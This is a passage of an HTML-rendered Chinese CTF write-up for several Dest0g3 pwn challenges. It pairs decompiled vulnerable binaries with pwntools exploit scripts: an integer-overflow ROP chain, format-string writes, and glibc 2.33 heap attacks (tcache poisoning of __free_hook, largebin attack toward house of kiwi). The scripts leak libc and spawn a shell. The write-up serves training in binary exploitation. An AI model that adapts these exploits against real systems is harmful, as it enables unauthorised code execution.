class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28547</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ez_pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">n</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;input num&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">hackme_addr = elf.sym.hackme</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;length of array:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1000</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">add(puts_plt)</span><br><span class="line">add(hackme_addr)</span><br><span class="line">add(puts_got)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;exit!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_addr - <span class="number">0x67560</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x3cf10</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x17b9db</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;length of array:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1000</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">add(signed(system_addr))</span><br><span class="line">add(hackme_addr)</span><br><span class="line">add(signed(binsh_addr))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;input your choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="dest-love"><a href="#dest-love" class="headerlink" title="dest_love"></a>dest_love</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 i; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What about your love to Dest0g3?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, format, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4010 == <span class="number">1314520</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I can feel your love!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your dont love Dest0g3 at all!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式化字符串漏洞，需要改写值的串在bss段里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29044</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">b&#x27;%12$p%10$p&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x1185</span></span><br><span class="line">stack = <span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0xd8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(stack % <span class="number">0x10000</span>))</span><br><span class="line"></span><br><span class="line">target = base + <span class="number">0x4010</span></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%&#123;&#125;c%39$hn&#x27;</span>.<span class="built_in">format</span>(target % <span class="number">0x10000</span>))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;What about your love to Dest0g3?\n&#x27;</span>,<span class="string">&#x27;%1314520c%12$n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line"></span><br><span class="line">  sub_11C5(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = read_n();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invaild Choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please tell me the index: &quot;</span>);</span><br><span class="line">  v0 = read_n();</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_40C0 + v0) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)v0 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;unk_40C0 + v0));</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Index!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>高版本（2.33）的UAF漏洞利用，在tcache里写入__free_hook，再写入system。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26427</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.33.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me its size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Please tell me its content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;4. show\n: &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Please tell me the index: \n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e0c00</span></span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">heap_addr1 = ((u64(r.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) + <span class="number">0x380</span></span><br><span class="line"><span class="comment">#print(hex(heap_addr1))</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_hook = libc_base + libc.sym.__free_hook</span><br><span class="line"><span class="comment">#print(hex(free_hook))</span></span><br><span class="line">heap_addr2 = (((u64(r.recv(<span class="number">8</span>)) ^ heap_addr1) &lt;&lt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) + <span class="number">0x330</span></span><br><span class="line"><span class="comment">#print(hex(heap_addr2))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = ((heap_addr2 &gt;&gt; <span class="number">12</span>) % (<span class="number">2</span>**<span class="number">64</span>)) ^ free_hook</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="built_in">next</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.sym.system</span><br><span class="line"><span class="comment">#print(hex(system_addr))</span></span><br><span class="line">add(<span class="number">0x40</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="emma"><a href="#emma" class="headerlink" title="emma"></a>emma</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read_n();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete(a1, a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">      a1 = <span class="string">&quot;Invaild Choice!&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invaild Choice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          show(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          add(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          edit(a1, a2);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v3 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">1047</span> &amp;&amp; v1 &lt;= <span class="number">4096</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, v3);</span><br><span class="line">    qword_4060[v2] = buf;</span><br><span class="line">    dword_40E0[v2] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  result = qword_4060[v0];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="type">void</span> *)qword_4060[v2], (<span class="type">int</span>)dword_40E0[v2]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v3 = v0;</span><br><span class="line">  v1 = qword_4060[v0];</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)qword_4060[v3]);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;qword_4060 + v0) )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;qword_4060 + v0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是高版本（2.33）的UAF，最小申请0x417大小的chunk；</p><p>先用负idx修改stderr指针，再利用LargeBin Attack修改__pointer_chk_guard，伪造stderr修改vtable，最后改topchunk触发house of kiwi。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25443&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.33.so&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Content&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span 